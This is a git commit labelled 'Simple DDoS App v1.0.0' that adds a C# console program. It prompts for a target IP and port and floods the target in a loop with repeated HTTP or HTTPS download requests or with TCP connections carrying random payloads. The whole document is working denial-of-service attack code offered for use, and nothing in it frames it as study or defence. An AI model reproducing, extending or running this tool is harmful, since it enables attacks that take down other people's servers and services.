dfebaf18cf25defc5e4560245b9cb4e3f63dc503
Arbross <victor.pavlovskyi@gmail.com>
2022-02-27 11:28:09 +0200

    Simple DDoS App v1.0.0

---
+++ DDoSApp/DDoSApp/DDoS Scripts/DDOSScript.cs
@@ -0,0 +1,109 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+using System.IO;
+using System.Net.Sockets;
+using System.Net;
+using System.Net.Http;
+
+namespace DDosApp.DDoS_Scripts
+{
+    internal static class DDOSScript
+    { 
+        public static int counter = 0;
+        public static Random seed = new Random();
+
+        // Http Download
+        public static async Task ProtocolHTTPDownload(string ip)
+        {
+            await Task.Factory.StartNew(() =>
+            {
+                try
+                {
+                    HttpClient httpClient = new HttpClient();
+
+                    httpClient.GetStringAsync(ip).Wait(1000);
+                    httpClient.GetStreamAsync(ip).Wait(1000);
+                    httpClient.Dispose();
+                    WebClient client = new WebClient();
+                    client.DownloadStringAsync(new Uri(ip));
+                    counter++;
+                }
+                catch
+                {
+                    counter++;
+
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine($"[ERROR {DateTime.Now}] The task is dropped {counter}.");
+
+                    return;
+                }
+
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine($"[INFO {DateTime.Now}] Task HTTP Download finised {counter}.");
+            });
+        }
+        
+        // Https Download
+        public static async Task ProtocolHTTPSDownload(string ip)
+        {
+            await Task.Factory.StartNew(() =>
+            {
+                try
+                {
+                    WebClient client = new WebClient();
+                    client.DownloadStringAsync(new Uri(ip));
+                    counter++;
+                }
+                catch
+                {
+                    counter++;
+
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine($"[ERROR {DateTime.Now}] The task is dropped {counter}.");
+
+                    return;
+                }
+
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine($"[INFO {DateTime.Now}] Task HTTPS Download finised {counter}.");
+            });
+        }
+        
+        // TCP Heavy
+        public static async Task ProtocolTCPHeavy(IPAddress ip, IPEndPoint port)
+        {
+            await Task.Factory.StartNew(() =>
+            {
+                int timeout = seed.Next(1000, 10000);
+                Socket sender = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+                try
+                {
+                    sender.ConnectAsync(port).Wait(timeout);
+                    sender.Send(Encoding.ASCII.GetBytes(RandomString(3000)));
+                    sender.Close();
+                }
+                catch (Exception)
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine($"[ERROR {DateTime.Now}] The task is dropped {counter}.");
+
+                    return;
+                }
+
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine($"[INFO {DateTime.Now}] Task TCP Heavy finised {counter}.");
+            });
+        }
+
+        private static string RandomString(int length)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+                .Select(s => s[seed.Next(s.Length)]).ToArray());;
+        }
+    }
+}
---
+++ DDoSApp/DDoSApp/Program.cs
@@ -0,0 +1,78 @@
+﻿using System.Net;
+using DDosApp.DDoS_Scripts;
+
+namespace DDosApp
+{
+    class Program
+    {
+        public static void Main()
+        {
+            MainAsync().GetAwaiter().GetResult();
+        }
+
+        public static async Task MainAsync()
+        {
+            while(true)
+            {
+                Console.ForegroundColor = ConsoleColor.White;
+                Console.WriteLine("Enter ip to DDoS : ");
+                string ip = Console.ReadLine();
+
+                Console.ForegroundColor = ConsoleColor.White;
+                Console.WriteLine("Enter port to DDoS : ");
+                string port = Console.ReadLine();
+
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.WriteLine($"1 - Http Download\n2 - Https Download\n3 - TCP Heavy");
+                char symbol = Console.ReadLine()[0];
+
+                await Switch(ip, port, symbol);
+            }
+        }
+
+        private static async Task Switch(string ip, string port, char symbol)
+        {
+            switch (symbol)
+            {
+                case '1':
+                    {
+                        Console.WriteLine("Press ESC to stop.");
+                        do
+                        {
+                            while (!Console.KeyAvailable)
+                            {
+                                await DDOSScript.ProtocolHTTPDownload(ip);
+                            }
+                        } while (Console.ReadKey(true).Key != ConsoleKey.Escape);
+                    }
+                    break;
+                case '2':
+                    {
+                        Console.WriteLine("Press ESC to stop.");
+                        do
+                        {
+                            while (!Console.KeyAvailable)
+                            {
+                                await DDOSScript.ProtocolHTTPSDownload(ip);
+                            }
+                        } while (Console.ReadKey(true).Key != ConsoleKey.Escape);
+                    }
+                    break;
+                case '3':
+                    {
+                        Console.WriteLine("Press ESC to stop.");
+                        do
+                        {
+                            while (!Console.KeyAvailable)
+                            {
+                                await DDOSScript.ProtocolTCPHeavy(IPAddress.Parse(ip), new IPEndPoint(IPAddress.Parse(ip), int.Parse(port)));
+                            }
+                        } while (Console.ReadKey(true).Key != ConsoleKey.Escape);
+                    }
+                    break;
+                default:
+                    break;
+            }
+        }
+    }
+}
